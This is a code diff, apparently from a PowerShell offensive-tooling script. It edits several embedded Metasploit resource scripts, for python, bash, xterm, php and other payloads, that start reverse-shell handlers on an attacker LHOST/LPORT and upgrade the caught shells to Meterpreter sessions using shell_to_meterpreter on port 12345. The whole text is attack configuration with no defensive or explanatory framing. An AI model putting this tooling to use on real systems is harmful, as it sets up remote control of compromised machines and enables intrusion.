@@ -10,10 +10,10 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-background
 use post/multi/manage/shell_to_meterpreter
+set LHOST $Lhost
+set LPORT 12345
 set session 1
-exploit -j -z
 "@
 
 $metasploit_python = @"
@@ -23,10 +23,10 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-background
 use post/multi/manage/shell_to_meterpreter
+set LHOST $Lhost
+set LPORT 12345
 set session 1
-exploit -j -z
 "@
 
 
@@ -37,10 +37,10 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-background
 use post/multi/manage/shell_to_meterpreter
+set LHOST $Lhost
+set LPORT 12345
 set session 1
-exploit -j -z
 "@
 
 
@@ -51,10 +51,10 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-background
 use post/multi/manage/shell_to_meterpreter
+set LHOST $Lhost
+set LPORT 12345
 set session 1
-exploit -j -z
 "@
 
 $metasploit_bash = @"
@@ -64,10 +64,10 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-background
 use post/multi/manage/shell_to_meterpreter
+set LHOST $Lhost
+set LPORT 12345
 set session 1
-exploit -j -z
 "@
 
 $metasploit_xterm = @"
@@ -77,10 +77,10 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-background
 use post/multi/manage/shell_to_meterpreter
+set LHOST $Lhost
+set LPORT 12345
 set session 1
-exploit -j -z
 "@
 
 $metasploit_php = @"
@@ -90,10 +90,10 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-background
 use post/multi/manage/shell_to_meterpreter
+set LHOST $Lhost
+set LPORT 12345
 set session 1
-exploit -j -z
 "@
 
 $banner1 = @"
